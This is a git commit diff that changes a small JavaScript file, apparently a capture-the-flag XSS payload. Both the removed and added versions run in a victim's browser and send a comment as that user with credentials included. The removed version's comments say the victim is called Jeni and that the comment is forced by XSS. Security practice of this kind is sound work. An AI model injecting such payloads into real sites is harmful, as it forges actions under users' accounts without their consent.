8aae84df4370d75d666bb51202a915c743f86ab9
Lucca Musomecci <74316806+notluken@users.noreply.github.com>
2025-10-05 18:33:42 -0300

    Update z.js

--- z.js
+++ z.js
@@ -1,17 +1,13 @@
-// ataque.js - Se ejecuta en el navegador de Jeni.
-(function() {
-    var f = new FormData();
-    // Cambiar por el parámetro de comentario real si es necesario
-    f.append('comment_text', '¡Comentario de Jeni forzado por XSS! CTF resuelto.'); 
+(function(){
+    var p = new URLSearchParams();
+    p.append('content', 'Holaaaa');
 
-    // ¡La ruta al endpoint de COMENTARIOS!
-    fetch('/comentarios', { 
+    fetch('/comment', {
         method: 'POST',
-        body: f,
-        credentials: 'include'
-    })
-    .then(response => {
-        console.log('Comentario publicado en el blog.');
-    })
-    .catch(console.error);
+        body: p,
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    });
 })();
